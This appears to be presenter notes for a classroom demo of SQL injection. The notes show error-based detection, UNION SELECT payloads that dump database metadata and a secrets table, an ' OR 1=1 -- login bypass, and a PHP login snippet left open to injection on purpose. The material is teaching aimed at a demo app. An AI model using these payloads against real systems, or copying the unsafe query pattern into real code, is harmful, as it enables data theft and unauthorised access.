# Error Based: SQL Injection into String Field

Check for error based SQL Injection by using a single-quote:

```'```

When the app has verbose error messages you will easily find a Syntax error.

When the app does not have verbose error messages check for visual changes such as a table not rendering. Alternatively 
are timing or logic based techniques for "blind" SQL Injection. Not covering those today.

## Data Extraction: Get something we are not entitled to see

UNION SELECT statements can return data from additional tables or locations.

The syntax of a "UNION SELECT" requires knowledge of the number of columns in the original query.


```' ORDER BY n```

```' ORDER BY n--```

Check for errors or behaviours indicating the query failed. Find the highest number "n" which does not trigger an error.

In this case the original query had three columns. So we need to use a "UNION SELECT" with three columns:

```
' UNION SELECT null, null, null--
' UNION SELECT 'a', 'b', 'c'--
' OR 1=1 UNION SELECT 'a', 'b', 'c'--
```

These should be valid and add a row to the results table. 

Lets prove we can extract information an attacker should not know which can be of use to them:

```
' UNION SELECT null, @@version, null--
```

You can get lots of useful information using this technique.

Demo over. *Back to slides.

# Error Based: SQL Injection into Numeric Field

String datatypes are wrapped in single-quotes but numeric fields are not.
We can still check for SQL Injection by adding a single-quote to an input field since it would trigger a syntax error.
So lets try this again:

```'```

Again, for error based SQL injection this will do well. We are not covering blind injection tonight.

Exploitation is similar to string fields but we do not need to add our own single quotes. So our payloads from before 
are now:

```
40 UNION SELECT null, null, null--
40 UNION SELECT 'a', 'b', 'c'--
40 OR 1=1 UNION SELECT 'a', 'b', 'c'--
```

The difference is we need to set a value to the original numeric field or it will trigger an error. So we start each
injection with a valid integer.

So far, same old same.

## Data Extraction: Data from another table

First find the name of other database tables. In MYSQL that means asking the "information_schema.tables" table:

```
40 UNION SELECT null, table_schema, table_name FROM information_schema.tables --
```

Oh snap, what is that "appdata.secretdata" table all about? Sounds juicy.
To get something from it it helps to know the column names used in the table:

```
40 UNION SELECT null, TABLE_NAME, COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='secretdata'
```

The table has only two columns "id", and "secretdata". And lets dump the secrets!

```
40 UNION SELECT id, secret, null from secretdata
```

You can enumerate and read all information stored in the database using these techniques.

Demo over. *Back to slides.

# Error Based: Authentication Bypass

We have shown data extraction so far. The definition of SQL Injection said "Allow an attacker to alter the intended logic"
That is a broad statement and you get some cool tricks like being able to bypass authentication IF the login form is 
vulnerable to SQL Injection.

The following shows example source code for a login form:

```php
$user = $_POST['username'];
$pass = $_POST['password'];

$sql = "select * from users where username='" . $user . "' and password='" . $pass ."'";
$result=mysqli_query($conn, $sql) or die($conn->error);
```

The username and password fields come from an HTTP request issued by the user.
The values are not subjected to any input validation before they are then added into the SQL query and executed.

Most login forms operate using a statement like this:

```
SELECT * FROM users WHERE username='<user>' AND password='<pass>'
```

If we can inject into the username location we can use magic to login as any user we want without knowing any passwords.

```
PAYLOAD: ' OR 1=1 --
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='<pass>'
```

We are in! It seems to say we are "admin" too, result!

Demo over. *Back to slides. 
